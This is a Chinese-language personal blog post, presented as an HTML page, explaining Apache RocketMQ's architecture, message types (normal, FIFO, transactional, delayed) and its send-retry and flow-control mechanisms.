<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>SBR Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="SBR Blog"><meta name="msapplication-TileImage" content="https://avatars.githubusercontent.com/u/41830790?v=4"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="SBR Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="SBR Blog"><meta property="og:url" content="https://songbaoru.github.io/"><meta property="og:site_name" content="SBR Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://songbaoru.github.io/img/og_image.png"><meta property="article:author" content="SBR"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://songbaoru.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://songbaoru.github.io"},"headline":"SBR Blog","image":["https://songbaoru.github.io/img/og_image.png"],"author":{"@type":"Person","name":"SBR"},"publisher":{"@type":"Organization","name":"SBR Blog","logo":{"@type":"ImageObject","url":"https://avatars.githubusercontent.com/u/41830790?v=4"}},"description":""}</script><link rel="icon" href="https://avatars.githubusercontent.com/u/41830790?v=4"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://avatars.githubusercontent.com/u/41830790?v=4" alt="SBR Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item is-active" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-05-24T08:13:44.000Z" title="2023/5/24 16:13:44">2023-05-24</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-05-30T03:07:51.205Z" title="2023/5/30 11:07:51">2023-05-30</time></span><span class="level-item"><a class="link-muted" href="/categories/IT/">IT</a></span><span class="level-item">an hour read (About 8715 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/24/RocketMQ/">RocketMQ</a></p><div class="content"><h1 id="RocketMQ简介"><a href="#RocketMQ简介" class="headerlink" title="RocketMQ简介"></a>RocketMQ简介</h1><p>RocketMQ是一款由Alibaba研发的分布式的消息中间件。支持事务消息、顺序消息、延时消息、定时消息、批量消息。</p>
<p>Apache RocketMQ 中消息的生命周期主要分为消息生产、消息存储、消息消费这三部分。生产者生产消息并发送至 Apache RocketMQ 服务端（Broker），消息被存储在Broker的主题（Topic）中，消费者通过订阅主题消费消息。</p>
<h1 id="消息中间件的应用场景"><a href="#消息中间件的应用场景" class="headerlink" title="消息中间件的应用场景"></a>消息中间件的应用场景</h1><p>消息中间件常用于分布式系统中的应用解耦、流量削峰填谷、异步处理等场景。比如，再秒杀业务中，在秒杀业务中下单后可以发送延迟消息，若5分钟未支付，就取消订单、回滚库存。</p>
<p>消息队列的应用场景：</p>
<ol>
<li>应用解耦：系统的耦合度越高，容错性就越低。在等待系统恢复正常的时间里，要处理的数据可以被缓存到消息队列中。</li>
<li>流量削峰填谷：消息到加入消息队列而不是直接发给消费者，消费者按照自己的消费速度从消息队列获取消息进行处理。</li>
<li>异步处理：不需要同步处理完成后才能响应，由消息队列缓存消息后续通知消息接收方进行异步处理，提高了响应效率。</li>
</ol>
<h1 id="模型概念"><a href="#模型概念" class="headerlink" title="模型概念"></a>模型概念</h1><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><ul>
<li><p>Broker</p>
<p>Broker是Apache RocketMQ的服务端，生产者生产的消息会发送到 Broker，并存储在Broker的主题（Topic）中。</p>
</li>
<li><p>NameServer</p>
<p>NameServer是Broker注册中心，支持Broker的注册和发现、Topic路由、Broker心跳检测。</p>
<p>NameServer通常采用集群的方式部署，各实例间互相不进行通信，Broker会向每一台NameServer注册，所以每一个NameServer都保存一份完整的路由信息，当某个NameServer下线了，Broker依然可以向其它的NameServer注册。</p>
</li>
</ul>
<h2 id="消息生产"><a href="#消息生产" class="headerlink" title="消息生产"></a><strong>消息生产</strong></h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/04producer">生产者（Producer）</a>：</p>
<p>Apache RocketMQ 中用于产生消息的运行实体，一般集成于业务调用链路的上游。生产者是轻量级匿名无身份的。</p>
</li>
</ul>
<h2 id="消息存储"><a href="#消息存储" class="headerlink" title="消息存储"></a><strong>消息存储</strong></h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/02topic">主题（Topic）</a>：</p>
<p>Apache RocketMQ 消息传输和存储的分组容器，主题内部由多个队列组成，消息的存储和水平扩展实际是通过主题内的队列实现的。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/03messagequeue">队列（MessageQueue）</a>：</p>
<p>Apache RocketMQ 消息传输和存储的实际单元容器，类比于其他消息队列中的分区。 Apache RocketMQ 通过流式特性的无限队列结构来存储消息，消息在队列内具备顺序性存储特征。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/04message">消息（Message）</a>：</p>
<p>Apache RocketMQ 的最小传输单元。消息具备不可变性，在初始化发送和完成存储后即不可变。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/docs/introduction/02concepts#messagetype">队列类型（MessageType）</a>：</p>
<p>由用于类型管理和安全验证的消息传输特性定义的类别。Apache RocketMQ支持NORMAL、FIFO、TRANSACTION和DELAY消息类型。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/docs/introduction/02concepts#messageview">消息视图（MessageView）</a>：</p>
<p>从开发的角度来看，MessageView 是消息的只读接口。消息视图允许读取消息中的多个属性和负载信息，但不能对消息本身进行任何更改。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/docs/introduction/02concepts#messagetag">消息标签（MessageTag）</a>：</p>
<p>MessageTag是一个细粒度的消息分类属性，允许在主题级别以下对消息进行细分。消费者通过订阅特定标签来实现消息过滤。</p>
</li>
</ul>
<h2 id="消息消费"><a href="#消息消费" class="headerlink" title="消息消费"></a><strong>消息消费</strong></h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/07consumergroup">消费者分组（ConsumerGroup）</a>：</p>
<p>Apache RocketMQ 发布订阅模型中定义的独立的消费身份分组，用于统一管理底层运行的多个消费者（Consumer）。同一个消费组的多个消费者必须保持消费逻辑和配置一致，共同分担该消费组订阅的消息，实现消费能力的水平扩展。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/08consumer">消费者（Consumer）</a>：</p>
<p>Apache RocketMQ 消费消息的运行实体，一般集成在业务调用链路的下游。消费者必须被指定到某一个消费组中。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/domainModel/09subscription">订阅关系（Subscription）</a>：</p>
<p>Apache RocketMQ 发布订阅模型中消息过滤、重试、消费进度的规则配置。订阅关系以消费组粒度进行管理，消费组通过定义订阅关系控制指定消费组下的消费者如何实现消息过滤、消费重试及消费进度恢复等。</p>
<p>Apache RocketMQ 的订阅关系除过滤表达式之外都是持久化的，即服务端重启或请求断开，订阅关系依然保留。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E6%B6%88%E8%B4%B9%E7%BB%93%E6%9E%9Cconsumeresult">消费结果（ConsumeResult）</a></p>
<p>Apache RocketMQ 中PushConsumer消费监听器处理消息完成后返回的处理结果，用来标识本次消息是否正确处理。消费结果包含消费成功和消费失败。</p>
</li>
</ul>
<h2 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/01normalmessage">普通消息</a></p>
<p>普通消息为 Apache RocketMQ 中最基础的消息，区别于有特性的顺序消息、定时&#x2F;延时消息和事务消息。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E4%BA%8B%E5%8A%A1%E6%B6%88%E6%81%AF">事务消息</a></p>
<p>事务消息是Apache RocketMQ 提供的一种高级消息类型，支持在分布式场景下保障消息生产和本地事务的最终一致性。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E5%AE%9A%E6%97%B6%E5%BB%B6%E6%97%B6%E6%B6%88%E6%81%AF">定时&#x2F;延时消息</a></p>
<p>定时&#x2F;延时消息是Apache RocketMQ 提供的一种高级消息类型，消息被发送至服务端后，在指定时间后才能被消费者消费。通过设置一定的定时时间可以实现分布式场景的延时调度触发效果。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E9%A1%BA%E5%BA%8F%E6%B6%88%E6%81%AF">顺序消息</a></p>
<p>顺序消息是Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。</p>
</li>
</ul>
<h2 id="消息处理"><a href="#消息处理" class="headerlink" title="消息处理"></a>消息处理</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E6%B6%88%E6%81%AF%E8%BF%87%E6%BB%A4">消息过滤</a></p>
<p>消费者可以通过订阅指定消息标签（Tag）对消息进行过滤，确保最终只接收被过滤后的消息合集。过滤规则的计算和匹配在Apache RocketMQ 的服务端完成。更多信息，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/07messagefilter">消息过滤</a>。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E9%87%8D%E7%BD%AE%E6%B6%88%E8%B4%B9%E4%BD%8D%E7%82%B9">重置消费位点</a></p>
<p>以时间轴为坐标，在消息持久化存储的时间范围内，重新设置消费者分组对已订阅主题的消费进度，设置完成后消费者将接收设定时间点之后，由生产者发送到Apache RocketMQ 服务端的消息。更多信息，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/09consumerprogress">重置消费位点</a>。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E6%B6%88%E6%81%AF%E8%BD%A8%E8%BF%B9">消息轨迹</a></p>
<p>在一条消息从生产者发出到消费者接收并处理过程中，由各个相关节点的时间、地点等数据汇聚而成的完整链路信息。通过消息轨迹，您能清晰定位消息从生产者发出，经由Apache RocketMQ 服务端，投递给消费者的完整链路，方便定位排查问题。</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/02concepts#%E6%B6%88%E6%81%AF%E5%A0%86%E7%A7%AF">消息堆积</a></p>
<p>生产者已经将消息发送到Apache RocketMQ 的服务端，但由于消费者的消费能力有限，未能在短时间内将所有消息正确消费掉，此时在服务端保存着未被消费的消息，该状态即消息堆积。</p>
</li>
</ul>
<h1 id="消息类型原理"><a href="#消息类型原理" class="headerlink" title="消息类型原理"></a>消息类型原理</h1><h2 id="普通消息"><a href="#普通消息" class="headerlink" title="普通消息"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/01normalmessage">普通消息</a></h2><p><strong>应用场景</strong></p>
<p>普通消息一般应用于微服务解耦、事件驱动、数据集成等场景，这些场景大多数要求数据传输通道具有可靠传输的能力，且对消息的处理时机、处理顺序没有特别要求。</p>
<p>普通消息仅支持使用MessageType为Normal主题，即普通消息只能发送至类型为普通消息的主题中，发送的消息的类型必须和主题的类型一致。</p>
<p><strong>普通消息生命周期</strong></p>
<ul>
<li>初始化：消息被生产者构建并完成初始化，待发送到服务端的状态。</li>
<li>待消费：消息被发送到服务端，对消费者可见，等待消费者消费的状态。</li>
<li>消费中：消息被消费者获取，并按照消费者本地的业务逻辑进行处理的过程。 此时服务端会等待消费者完成消费并提交消费结果，如果一定时间后没有收到消费者的响应，Apache RocketMQ会对消息进行重试处理。具体信息，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/10consumerretrypolicy">消费重试</a>。</li>
<li>消费提交：消费者完成消费处理，并向服务端提交消费结果，服务端标记当前消息已经被处理（包括消费成功和失败）。 Apache RocketMQ默认支持保留所有消息，此时消息数据并不会立即被删除，只是逻辑标记已消费。消息在保存时间到期或存储空间不足被删除前，消费者仍然可以回溯消息重新消费。</li>
<li>消息删除：Apache RocketMQ按照消息保存机制滚动清理最早的消息数据，将消息从物理文件中删除。更多信息，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/11messagestorepolicy">消息存储和清理机制</a>。</li>
</ul>
<h2 id="顺序消息"><a href="#顺序消息" class="headerlink" title="顺序消息"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/03fifomessage">顺序消息</a></h2><p>顺序消息是 Apache RocketMQ 提供的一种高级消息类型，支持消费者按照发送消息的先后顺序获取消息，从而实现业务场景中的顺序处理。 相比其他类型消息，顺序消息在发送、存储和投递的处理过程中，更多强调多条消息间的先后顺序关系。</p>
<p>Apache RocketMQ 顺序消息的顺序关系通过消息组（MessageGroup）判定和识别，发送顺序消息时需要为每条消息设置归属的消息组，相同消息组的多条消息之间遵循先进先出的顺序关系，不同消息组、无消息组的消息之间不涉及顺序性。</p>
<p>基于消息组的顺序判定逻辑，支持按照业务逻辑做细粒度拆分，可以在满足业务局部顺序的前提下提高系统的并行度和吞吐能力。</p>
<p>顺序消息仅支持使用MessageType为FIFO的主题，即顺序消息只能发送至类型为顺序消息的主题中，发送的消息的类型必须和主题的类型一致。</p>
<p><strong>应用场景</strong></p>
<p>在有序事件处理、撮合交易、数据实时增量同步等场景下，异构系统间需要维持强一致的状态同步，上游的事件变更需要按照顺序传递到下游进行处理。在这类场景下使用 Apache RocketMQ 的顺序消息可以有效保证数据传输的顺序性。</p>
<ul>
<li><p><strong>典型场景一：撮合交易</strong></p>
<p>以证券、股票交易撮合场景为例，对于出价相同的交易单，坚持按照先出价先交易的原则，下游处理订单的系统需要严格按照出价顺序来处理订单。</p>
</li>
<li><p><strong>典型场景二：数据实时增量同步</strong></p>
<p>以数据库变更增量同步场景为例，上游源端数据库按需执行增删改操作，将二进制操作日志作为消息，通过 Apache RocketMQ 传输到下游搜索系统，下游系统按顺序还原消息数据，实现状态数据按序刷新。如果是普通消息则可能会导致状态混乱，和预期操作结果不符，基于顺序消息可以实现下游状态和上游操作结果一致。</p>
</li>
</ul>
<p><strong>如何保证消息的顺序性</strong></p>
<p>Apache RocketMQ 的消息的顺序性分为两部分，生产顺序性和消费顺序性。</p>
<ul>
<li><p><strong>生产顺序性</strong> ：</p>
<p>Apache RocketMQ 通过生产者和服务端的协议保障单个生产者串行地发送消息，并按序存储和持久化。</p>
<p>如需保证消息生产的顺序性，则必须满足以下条件：</p>
<ul>
<li>单一生产者：消息生产的顺序性仅支持单一生产者，不同生产者分布在不同的系统，即使设置相同的消息组，不同生产者之间产生的消息也无法判定其先后顺序。</li>
<li>串行发送：Apache RocketMQ 生产者客户端支持多线程安全访问，但如果生产者使用多线程并行发送，则不同线程间产生的消息将无法判定其先后顺序。</li>
</ul>
<p>满足以上条件的生产者，将顺序消息发送至 Apache RocketMQ 后，会保证设置了同一消息组的消息，按照发送顺序存储在同一队列中。服务端顺序存储逻辑如下：</p>
<ul>
<li>相同消息组的消息按照先后顺序被存储在同一个队列。</li>
<li>不同消息组的消息可以混合在同一个队列中，且不保证连续。</li>
</ul>
<p><img src="https://rocketmq.apache.org/zh/assets/images/fifomessagegroup-aad0a1b7e64089075db956c0eca0cbf4.png" alt="顺序存储逻辑"></p>
</li>
</ul>
<p>如上图所示，消息组1和消息组4的消息混合存储在队列1中， Apache RocketMQ 保证消息组1中的消息G1-M1、G1-M2、G1-M3是按发送顺序存储，且消息组4的消息G4-M1、G4-M2也是按顺序存储，但消息组1和消息组4中的消息不涉及顺序关系。</p>
<ul>
<li><p><strong>消费顺序性</strong> ：</p>
<p>Apache RocketMQ 通过消费者和服务端的协议保障消息消费严格按照存储的先后顺序来处理。</p>
<p>如需保证消息消费的顺序性，则必须满足以下条件：</p>
<ul>
<li><p>投递顺序</p>
<p>Apache RocketMQ 通过客户端SDK和服务端通信协议保障消息按照服务端存储顺序投递，但业务方消费消息时需要严格按照接收—处理—应答的语义处理消息，避免因异步处理导致消息乱序。</p>
<p>备注：消费者类型为PushConsumer时， Apache RocketMQ 保证消息按照存储顺序一条一条投递给消费者，若消费者类型为SimpleConsumer，则消费者有可能一次拉取多条消息。此时，消息消费的顺序性需要由业务方自行保证。消费者类型的具体信息，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/06consumertype">消费者分类</a>。</p>
</li>
<li><p>有限重试</p>
<p>Apache RocketMQ 顺序消息投递仅在重试次数限定范围内，即一条消息如果一直重试失败，超过最大重试次数后将不再重试，跳过这条消息消费，不会一直阻塞后续消息处理。</p>
<p>对于需要严格保证消费顺序的场景，请务设置合理的重试次数，避免参数不合理导致消息乱序。</p>
</li>
</ul>
</li>
</ul>
<p><strong>生产顺序性和消费顺序性组合</strong></p>
<p>如果消息需要严格按照先进先出（FIFO）的原则处理，即先发送的先消费、后发送的后消费，则必须要同时满足生产顺序性和消费顺序性。</p>
<p>一般业务场景下，同一个生产者可能对接多个下游消费者，不一定所有的消费者业务都需要顺序消费，您可以将生产顺序性和消费顺序性进行差异化组合，应用于不同的业务场景。例如发送顺序消息，但使用非顺序的并发消费方式来提高吞吐能力。</p>
<p><strong>顺序消息生命周期</strong></p>
<p><a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></p>
<h2 id="事务消息"><a href="#事务消息" class="headerlink" title="事务消息"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/04transactionmessage">事务消息</a></h2><p>Apache RocketMQ 提供的事务消息支持在分布式场景下保障消息的最终一致性。</p>
<p><strong>其它事务消息的处理方案</strong></p>
<ul>
<li><p><strong>传统XA事务方案：性能不足</strong></p>
<p>为了保证分支的执行结果一致性，典型方案是基于XA协议的分布式事务系统来实现。将多个调用分支封装成包含独立事务分支的大事务。基于XA分布式事务的方案可以满足业务处理结果的正确性，但最大的缺点是多分支环境下资源锁定范围大，并发度低，随着下游分支的增加，系统性能会越来越差。</p>
</li>
</ul>
<p><strong>事务消息处理流程</strong></p>
<p>事务消息交互流程如下图所示。<img src="https://rocketmq.apache.org/zh/assets/images/transflow-0b07236d124ddb814aeaf5f6b5f3f72c.png" alt="事务消息"></p>
<ol>
<li>生产者将消息发送至Apache RocketMQ服务端。</li>
<li>Apache RocketMQ服务端将消息持久化成功之后，向生产者返回Ack确认消息已经发送成功，此时消息被标记为”暂不能投递”，这种状态下的消息即为<strong>半事务消息</strong>。</li>
<li>生产者开始执行本地事务逻辑。</li>
<li>生产者根据本地事务执行结果向服务端提交二次确认结果（Commit或是Rollback），服务端收到确认结果后处理逻辑如下：<ul>
<li>二次确认结果为Commit：服务端将半事务消息标记为可投递，并投递给消费者。</li>
<li>二次确认结果为Rollback：服务端将回滚事务，不会将半事务消息投递给消费者。</li>
</ul>
</li>
<li>在断网或者是生产者应用重启的特殊情况下，若服务端未收到发送者提交的二次确认结果，或服务端收到的二次确认结果为Unknown未知状态，经过固定时间后，服务端将对消息生产者即生产者集群中任一生产者实例发起消息回查。 <strong>说明</strong>：服务端回查的间隔时间和最大回查次数，请参见<a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/introduction/03limits">参数限制</a>。</li>
<li>生产者收到消息回查后，需要检查对应消息的本地事务执行的最终结果。</li>
<li>生产者根据检查到的本地事务的最终状态再次提交二次确认，服务端仍按照步骤4对半事务消息进行处理。</li>
</ol>
<p><strong>事务消息生命周期</strong></p>
<ul>
<li>初始化：半事务消息被生产者构建并完成初始化，待发送到服务端的状态。</li>
<li>事务待提交：半事务消息被发送到服务端，和普通消息不同，并不会直接被服务端持久化，而是会被单独存储到事务存储系统中，等待第二阶段本地事务返回执行结果后再提交。此时消息对下游消费者不可见。</li>
<li>消息回滚：第二阶段如果事务执行结果明确为回滚，服务端会将半事务消息回滚，该事务消息流程终止。</li>
<li>提交待消费：第二阶段如果事务执行结果明确为提交，服务端会将半事务消息重新存储到普通存储系统中，此时消息对下游消费者可见，等待被消费者获取并消费。</li>
<li>消费中：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
<li>消费提交：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
<li>消息删除：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
</ul>
<h2 id="定时-x2F-延时消息"><a href="#定时-x2F-延时消息" class="headerlink" title="定时&#x2F;延时消息"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/02delaymessage">定时&#x2F;延时消息</a></h2><p>在分布式定时调度触发、任务超时处理等场景，需要实现精准、可靠的定时事件触发。使用 Apache RocketMQ 的定时消息可以简化定时调度任务的开发逻辑，实现高性能、可扩展、高可靠的定时触发能力。</p>
<ul>
<li>定时消息：例如，当前系统时间为2022-06-09 17:30:00，您希望消息在下午19:20:00定时投递，则定时时间为2022-06-09 19:20:00，转换成时间戳格式为1654773600000。</li>
<li>延时消息：例如，当前系统时间为2022-06-09 17:30:00，您希望延时1个小时后投递消息，则您需要根据当前时间和延时时长换算成定时时刻，即消息投递时间为2022-06-09 18:30:00，转换为时间戳格式为1654770600000。</li>
</ul>
<p>定时消息仅支持在 MessageType为Delay 的主题内使用，即定时消息只能发送至类型为定时消息的主题中，发送的消息的类型必须和主题的类型一致。</p>
<p><strong>应用场景</strong></p>
<ul>
<li><p><strong>典型场景一：分布式定时调度</strong></p>
<p>在分布式定时调度场景下，需要实现各类精度的定时任务，例如每天5点执行文件清理，每隔2分钟触发一次消息推送等需求。传统基于数据库的定时调度方案在分布式场景下，性能不高，实现复杂。基于 Apache RocketMQ 的定时消息可以封装出多种类型的定时触发器。</p>
</li>
<li><p><strong>典型场景二：任务超时处理</strong></p>
<p>以电商交易场景为例，订单下单后暂未支付，此时不可以直接关闭订单，而是需要等待一段时间后才能关闭订单。使用 Apache RocketMQ 定时消息可以实现超时任务的检查触发。</p>
</li>
</ul>
<p><strong>定时消息生命周期</strong></p>
<ul>
<li>初始化：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
<li>定时中：消息被发送到服务端，和普通消息不同的是，服务端不会直接构建消息索引，而是会将定时消息单独存储在定时存储系统中，等待定时时刻到达。</li>
<li>待消费：定时时刻到达后，服务端将消息重新写入普通存储引擎，对下游消费者可见，等待消费者消费的状态。</li>
<li>消费中：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
<li>消费提交：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
<li>消息删除：<a href="##%E6%99%AE%E9%80%9A%E6%B6%88%E6%81%AF">同普通消息的生命周期</a></li>
</ul>
<h1 id="消息处理原理"><a href="#消息处理原理" class="headerlink" title="消息处理原理"></a>消息处理原理</h1><h2 id="消息发送重试机制"><a href="#消息发送重试机制" class="headerlink" title="消息发送重试机制"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy">消息发送重试机制</a></h2><p>Apache RocketMQ 客户端连接服务端发起消息发送请求时，可能会因为网络故障、服务异常等原因导致调用失败。为保证消息的可靠性， Apache RocketMQ 在客户端SDK中内置请求重试逻辑，尝试通过重试发送达到最终调用成功的效果。</p>
<p>同步发送和异步发送模式均支持消息发送重试。</p>
<p> <strong>重试触发条件</strong></p>
<p>触发消息发送重试机制的条件如下：</p>
<ul>
<li>客户端消息发送请求调用失败或请求超时</li>
<li>网络异常造成连接失败或请求超时。</li>
<li>服务端节点处于重启或下线等状态造成连接失败。</li>
<li>服务端运行慢造成请求超时。</li>
<li>服务端返回失败错误码<ul>
<li>系统逻辑错误：因运行逻辑不正确造成的错误。</li>
<li>系统流控错误：因容量超限造成的流控错误。</li>
</ul>
</li>
</ul>
<p>对于事务消息，只会进行<a target="_blank" rel="noopener" href="https://github.com/grpc/proposal/blob/master/A6-client-retries.md#transparent-retries">透明重试（transparent retries）</a>，网络超时或异常等场景不会进行重试。</p>
<h3 id="重试流程"><a href="#重试流程" class="headerlink" title="重试流程"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy#%E9%87%8D%E8%AF%95%E6%B5%81%E7%A8%8B">重试流程</a></h3><p>生产者在初始化时设置消息发送最大重试次数，当出现上述触发条件的场景时，生产者客户端会按照设置的重试次数一直重试发送消息，直到消息发送成功或达到最大重试次数重试结束，并在最后一次重试失败后返回调用错误响应。</p>
<ul>
<li>同步发送：调用线程会一直阻塞，直到某次重试成功或最终重试失败，抛出错误码和异常。</li>
<li>异步发送：调用线程不会阻塞，但调用结果会通过异常事件或者成功事件返回。</li>
</ul>
<h3 id="功能约束"><a href="#功能约束" class="headerlink" title="功能约束"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy#%E5%8A%9F%E8%83%BD%E7%BA%A6%E6%9D%9F">功能约束</a></h3><ul>
<li>链路耗时阻塞评估：从上述重试机制可以看出，在重试流程中生产者仅能控制最大重试次数。若由于系统异常触发了SDK内置的重试逻辑，则服务端需要等待最终重试结果，可能会导致消息发送请求链路被阻塞。对于某些实时调用类场景，您需要合理评估每次调用请求的超时时间以及最大重试次数，避免影响全链路的耗时。</li>
<li>最终异常兜底： Apache RocketMQ 客户端内置的发送请求重试机制并不能保证消息发送一定成功。当最终重试仍然失败时，业务方调用需要捕获异常，并做好冗余保护处理，避免消息发送结果不一致。</li>
<li>消息重复问题：因远程调用的不确定性，当Apache RocketMQ客户端因请求超时触发消息发送重试流程，此时客户端无法感知服务端的处理结果，客户端进行的消息发送重试可能会产生消息重复问题，业务逻辑需要自行处理消息重复问题。</li>
</ul>
<h2 id="消息流控机制"><a href="#消息流控机制" class="headerlink" title="消息流控机制"></a><a target="_blank" rel="noopener" href="https://rocketmq.apache.org/zh/docs/featureBehavior/05sendretrypolicy">消息流控机制</a></h2><p>消息流控指的是系统容量或水位过高， Apache RocketMQ 服务端会通过快速失败返回流控错误来避免底层资源承受过高压力。</p>
